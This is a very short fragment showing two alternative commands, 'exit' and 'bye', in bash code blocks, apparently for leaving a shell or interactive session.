```bash
exit
```

or

```bash
bye
```
